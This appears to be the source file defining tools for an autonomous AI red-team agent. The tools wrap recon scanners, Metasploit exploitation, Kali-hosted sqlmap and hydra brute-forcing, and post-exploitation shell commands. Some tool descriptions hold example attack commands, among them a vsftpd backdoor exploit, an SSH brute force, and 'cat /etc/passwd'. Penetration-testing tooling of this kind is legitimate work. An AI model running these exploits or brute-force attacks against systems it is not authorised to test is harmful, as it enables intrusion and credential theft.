"""
agent/tools.py
──────────────
Defines the 19 tools available to the AutoRedTeam agent:

  Passive Recon:
  - whois_lookup
  - dns_recon
  - theharvester_scan

  Active Scanning:
  - nmap_scan
  - nikto_scan
  - gobuster_scan
  - enum4linux_scan
  - searchsploit_lookup

  Exploitation (Metasploit RPC):
  - msf_run_exploit
  - msf_list_sessions
  - msf_run_command

  Intelligence:
  - analyze_cve_with_model
  - query_cve_database
  - query_attack_techniques

Each tool has:
  - A Claude API tool definition (name, description, input_schema)
  - An execute() function that runs the real tool and returns a string result
"""

import sys
import json
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import chromadb
from chromadb.utils import embedding_functions

import config
from mcp_server.tools.metasploit_tool import run_exploit, list_sessions, run_session_command
from agent.kali_client import check_kali_reachable, call_kali_tool, list_kali_tools
from mcp_server.tools.whois_tool import run_whois
from mcp_server.tools.dns_recon_tool import run_dns_recon
from mcp_server.tools.theharvester_tool import run_theharvester
from mcp_server.tools.nmap_tool import run_nmap
from mcp_server.tools.nikto_tool import run_nikto
from mcp_server.tools.gobuster_tool import run_gobuster
from mcp_server.tools.enum4linux_tool import run_enum4linux
from mcp_server.tools.searchsploit_tool import run_searchsploit
from agent.model_analyzer import analyze_cve


# ── Claude tool definitions ───────────────────────────────────

TOOL_DEFINITIONS = [
    # ── Passive Recon ────────────────────────────────────────
    {
        "name": "whois_lookup",
        "description": (
            "Perform a WHOIS lookup on the target IP or domain. "
            "Always call this FIRST as the initial passive reconnaissance step. "
            "Returns: organisation name, country, ASN, netblock, and abuse contact. "
            "Works for both IP addresses and domain names."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "IP address or domain name"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "dns_recon",
        "description": (
            "Perform DNS reconnaissance on the target. "
            "For IPs: reverse PTR lookup to find the hostname. "
            "For domains: resolves A, AAAA, MX, NS, TXT, SOA records; "
            "attempts zone transfer; brute-forces common subdomains. "
            "Call this second, after whois_lookup."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "IP address or domain name"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "theharvester_scan",
        "description": (
            "Run theHarvester to collect OSINT on a domain target: "
            "email addresses, subdomains, and associated IPs from public sources "
            "(search engines, certificate transparency logs). "
            "Only useful for domain names — automatically skipped for IP addresses."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain name (e.g. 'example.com'). Pass the target as-is — skipped automatically if it's an IP."},
                "sources": {"type": "string", "description": "Comma-separated sources (default: 'bing,duckduckgo,crtsh')"},
            },
            "required": ["domain"],
        },
    },
    # ── Active Scanning ───────────────────────────────────────
    {
        "name": "nmap_scan",
        "description": (
            "Run an nmap port and service scan against the target. "
            "Always call this first to discover what's running on the target. "
            "Returns open ports, service names, and version strings."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP address"},
                "ports":  {"type": "string", "description": "Port range (default '1-1000')"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "nikto_scan",
        "description": (
            "Run a Nikto web vulnerability scan against an HTTP/HTTPS service. "
            "Call this when nmap reveals port 80, 443, 8080, or any web service. "
            "Returns misconfigurations, outdated software, and known web vulnerabilities."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP address"},
                "port":   {"type": "integer", "description": "Web port (default 80)"},
                "ssl":    {"type": "boolean", "description": "Use HTTPS (default false)"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "gobuster_scan",
        "description": (
            "Run Gobuster directory enumeration to find hidden paths, admin panels, "
            "and exposed files on a web server. Call after nikto_scan to expand coverage."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target":     {"type": "string", "description": "Target IP address"},
                "port":       {"type": "integer", "description": "Web port (default 80)"},
                "ssl":        {"type": "boolean", "description": "Use HTTPS (default false)"},
                "extensions": {"type": "string", "description": "File extensions (default 'php,html,txt,bak')"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "enum4linux_scan",
        "description": (
            "Run enum4linux-ng SMB/NetBIOS enumeration against the target. "
            "Call this when nmap finds port 139 or 445 open (Samba/Windows shares). "
            "Returns: user accounts, shared folders, OS version, password policy, and null session status. "
            "This is critical for identifying weak SMB configurations and user enumeration."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP address"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "searchsploit_lookup",
        "description": (
            "Search the local ExploitDB database for public exploits matching a service or version. "
            "Call this after finding a service with nmap to discover known public exploits. "
            "Examples: 'vsftpd 2.3.4', 'samba 3.0.20', 'apache 2.2', 'php 5.4'. "
            "Returns exploit titles, file paths, and ExploitDB URLs."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Service name and version to search (e.g. 'vsftpd 2.3.4')"},
            },
            "required": ["query"],
        },
    },
    # ── Exploitation (Metasploit RPC) ────────────────────────
    {
        "name": "msf_run_exploit",
        "description": (
            "Execute a Metasploit exploit module against the target via msfrpcd. "
            "Only call this AFTER confirming the vulnerability with query_cve_database "
            "and searchsploit_lookup. Returns a session_id if successful. "
            "Requires msfrpcd to be running (see setup). "
            "IMPORTANT: Only use against authorised targets you own or have written permission to test."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "module": {
                    "type": "string",
                    "description": "MSF module path e.g. 'exploit/unix/ftp/vsftpd_234_backdoor'",
                },
                "rhosts": {
                    "type": "string",
                    "description": "Target IP address",
                },
                "lhost": {
                    "type": "string",
                    "description": "Attacker IP (your machine's IP on the target network, e.g. 192.168.128.1)",
                },
                "options": {
                    "type": "object",
                    "description": "Extra module options e.g. {\"RPORT\": \"21\"}",
                },
            },
            "required": ["module", "rhosts", "lhost"],
        },
    },
    {
        "name": "msf_list_sessions",
        "description": (
            "List all active Metasploit sessions (shells and Meterpreter sessions). "
            "Call this after msf_run_exploit to confirm a session was opened "
            "and to get the session_id for msf_run_command."
        ),
        "input_schema": {
            "type": "object",
            "properties": {},
            "required": [],
        },
    },
    {
        "name": "msf_run_command",
        "description": (
            "Execute a shell command inside an active Metasploit session. "
            "Use this for post-exploitation: gather system info, read files, "
            "enumerate users, check for privilege escalation opportunities. "
            "Useful commands: 'id', 'whoami', 'uname -a', 'cat /etc/passwd', "
            "'ip addr', 'ps aux', 'find / -perm -4000 -type f 2>/dev/null'."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "session_id": {
                    "type": "integer",
                    "description": "Session ID from msf_list_sessions or msf_run_exploit",
                },
                "command": {
                    "type": "string",
                    "description": "Shell command to execute in the session",
                },
            },
            "required": ["session_id", "command"],
        },
    },
    # ── Kali MCP (remote — all tools if Kali VM is running) ──────
    {
        "name": "kali_recon",
        "description": (
            "Run ANY recon tool on the Kali Linux MCP server over the network. "
            "Available: nmap, masscan, theHarvester, dnsenum, dnsrecon, fierce, amass, subfinder. "
            "Preferred over local tools — richer output, more options. "
            "Example nmap args: ['-sV', '-sC', '-p', '1-1000', '192.168.128.2']"
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "tool": {"type": "string", "description": "Tool name (e.g. 'nmap', 'theHarvester')"},
                "args": {"type": "array", "items": {"type": "string"},
                         "description": "Arguments passed directly to the tool"},
            },
            "required": ["tool", "args"],
        },
    },
    {
        "name": "kali_web_scan",
        "description": (
            "Run web scanning tools on Kali: nikto, gobuster, sqlmap, wfuzz, ffuf, "
            "feroxbuster, whatweb, wafw00f. "
            "Example sqlmap args: ['-u', 'http://192.168.128.2/dvwa/vulnerabilities/sqli/', '--dbs']"
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "tool": {"type": "string"},
                "args": {"type": "array", "items": {"type": "string"}},
            },
            "required": ["tool", "args"],
        },
    },
    {
        "name": "kali_exploit",
        "description": (
            "Run Metasploit on Kali. Pass semicolon-separated msfconsole commands in args[0]. "
            "Example: ['use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.128.2; "
            "set LHOST 192.168.128.3; run; exit']"
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "tool": {"type": "string", "description": "'msfconsole' or 'searchsploit'"},
                "args": {"type": "array", "items": {"type": "string"}},
                "timeout": {"type": "integer", "description": "Seconds (default 300)"},
            },
            "required": ["tool", "args"],
        },
    },
    {
        "name": "kali_password_attack",
        "description": (
            "Run password brute-force tools on Kali: hydra, john, hashcat, medusa. "
            "Example hydra SSH brute-force: ['-L', '/tmp/users.txt', '-P', "
            "'/usr/share/wordlists/rockyou.txt', '192.168.128.2', 'ssh']. "
            "ONLY use against authorised targets."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "tool": {"type": "string"},
                "args": {"type": "array", "items": {"type": "string"}},
            },
            "required": ["tool", "args"],
        },
    },
    {
        "name": "kali_post_exploit",
        "description": (
            "Run post-exploitation commands or tools on Kali. "
            "Use tool='shell' with args=['command'] for arbitrary shell commands. "
            "Also supports: linpeas.sh, linenum.sh, pspy, linux-exploit-suggester."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "tool": {"type": "string", "description": "'shell' or a specific tool name"},
                "args": {"type": "array", "items": {"type": "string"}},
            },
            "required": ["tool", "args"],
        },
    },
    # ── Intelligence ──────────────────────────────────────────
    {
        "name": "analyze_cve_with_model",
        "description": (
            "Use the fine-tuned Llama 3.1 8B security model to perform deep CVE analysis. "
            "Call this for your top 2-3 CRITICAL findings to get expert exploitation context, "
            "attack vectors, and remediation advice from the specialized pentest model. "
            "Input should be the CVE ID plus a brief description of the service and vulnerability."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "cve_text": {
                    "type": "string",
                    "description": "CVE ID and vulnerability description (e.g. 'CVE-2007-2447: Samba 3.0.20 username map script RCE')",
                },
            },
            "required": ["cve_text"],
        },
    },
    {
        "name": "query_cve_database",
        "description": (
            "Search the CVE knowledge base for vulnerabilities matching a service or version. "
            "Call this for each service found by nmap to find known CVEs. "
            "Example queries: 'vsftpd 2.3.4 remote code execution', 'Apache 2.2 directory traversal'"
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Service name, version, and vulnerability type to search for"},
                "top_k": {"type": "integer", "description": "Number of results to return (default 3)"},
            },
            "required": ["query"],
        },
    },
    {
        "name": "query_attack_techniques",
        "description": (
            "Search the MITRE ATT&CK knowledge base for techniques relevant to discovered services. "
            "Use this to map findings to ATT&CK tactics and techniques for the report."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Tactic or technique to search for (e.g. 'exploitation of remote services FTP')"},
                "top_k": {"type": "integer", "description": "Number of results to return (default 3)"},
            },
            "required": ["query"],
        },
    },
]


# ── ChromaDB RAG query ────────────────────────────────────────

_chroma_client = None
_chroma_emb_fn = None

def _get_chroma_collection(collection_name: str):
    global _chroma_client, _chroma_emb_fn
    if _chroma_client is None:
        _chroma_client = chromadb.PersistentClient(path=str(config.DB_DIR))
        _chroma_emb_fn = embedding_functions.SentenceTransformerEmbeddingFunction(
            model_name=config.EMBEDDING_MODEL
        )
    return _chroma_client.get_collection(name=collection_name, embedding_function=_chroma_emb_fn)


def _query_collection(collection_name: str, query: str, top_k: int = 3) -> str:
    try:
        collection = _get_chroma_collection(collection_name)
        results = collection.query(query_texts=[query], n_results=top_k)
        docs = results["documents"][0]
        metas = results["metadatas"][0]
        output = []
        for doc, meta in zip(docs, metas):
            output.append(doc[:600])
        return "\n\n---\n\n".join(output)
    except Exception as e:
        return f"RAG query error: {e}"


# ── Tool executor ─────────────────────────────────────────────

def execute_tool(name: str, inputs: dict) -> str:
    """Execute a tool by name and return result as a string for the agent."""

    if name == "whois_lookup":
        result = run_whois(target=inputs["target"])
        result.pop("raw_output", None)
        return json.dumps(result, indent=2)

    elif name == "dns_recon":
        result = run_dns_recon(target=inputs["target"])
        return json.dumps(result, indent=2)

    elif name == "theharvester_scan":
        result = run_theharvester(
            domain=inputs["domain"],
            sources=inputs.get("sources", "bing,duckduckgo,crtsh"),
        )
        return json.dumps(result, indent=2)

    elif name == "nmap_scan":
        result = run_nmap(
            target=inputs["target"],
            ports=inputs.get("ports", "1-1000"),
        )
        result.pop("raw_output", None)
        return json.dumps(result, indent=2)

    elif name == "nikto_scan":
        result = run_nikto(
            target=inputs["target"],
            port=inputs.get("port", 80),
            ssl=inputs.get("ssl", False),
        )
        result.pop("raw_output", None)
        return json.dumps(result, indent=2)

    elif name == "gobuster_scan":
        result = run_gobuster(
            target=inputs["target"],
            port=inputs.get("port", 80),
            ssl=inputs.get("ssl", False),
            extensions=inputs.get("extensions", "php,html,txt,bak"),
        )
        result.pop("raw_output", None)
        return json.dumps(result, indent=2)

    elif name == "enum4linux_scan":
        result = run_enum4linux(target=inputs["target"])
        result.pop("raw_output", None)
        return json.dumps(result, indent=2)

    elif name == "searchsploit_lookup":
        result = run_searchsploit(query=inputs["query"])
        return json.dumps(result, indent=2)

    elif name == "msf_run_exploit":
        result = run_exploit(
            module=inputs["module"],
            rhosts=inputs["rhosts"],
            lhost=inputs["lhost"],
            options=inputs.get("options", {}),
        )
        return json.dumps(result, indent=2)

    elif name == "msf_list_sessions":
        result = list_sessions()
        return json.dumps(result, indent=2)

    elif name == "msf_run_command":
        result = run_session_command(
            session_id=inputs["session_id"],
            command=inputs["command"],
        )
        return json.dumps(result, indent=2)

    elif name in ("kali_recon", "kali_web_scan", "kali_exploit",
                  "kali_password_attack", "kali_post_exploit"):
        category_map = {
            "kali_recon":           "recon",
            "kali_web_scan":        "web_scan",
            "kali_exploit":         "exploit",
            "kali_password_attack": "password_attack",
            "kali_post_exploit":    "post_exploit",
        }
        if not check_kali_reachable():
            return json.dumps({
                "error": "Kali MCP server unreachable. "
                         "Boot the Kali VM in UTM and run: python3 kali_mcp_server/server.py",
                "kali_url": config.KALI_MCP_URL,
            })
        result = call_kali_tool(
            tool_category=category_map[name],
            tool=inputs["tool"],
            args=inputs.get("args", []),
            timeout=inputs.get("timeout", 180),
        )
        return json.dumps(result, indent=2)

    elif name == "analyze_cve_with_model":
        analysis, model_source = analyze_cve(inputs["cve_text"])
        return json.dumps({
            "cve_text":     inputs["cve_text"],
            "model_source": model_source,
            "analysis":     analysis,
        }, indent=2)

    elif name == "query_cve_database":
        return _query_collection(
            config.CVE_COLLECTION,
            query=inputs["query"],
            top_k=inputs.get("top_k", 3),
        )

    elif name == "query_attack_techniques":
        return _query_collection(
            config.ATTACK_COLLECTION,
            query=inputs["query"],
            top_k=inputs.get("top_k", 3),
        )

    else:
        return f"Unknown tool: {name}"
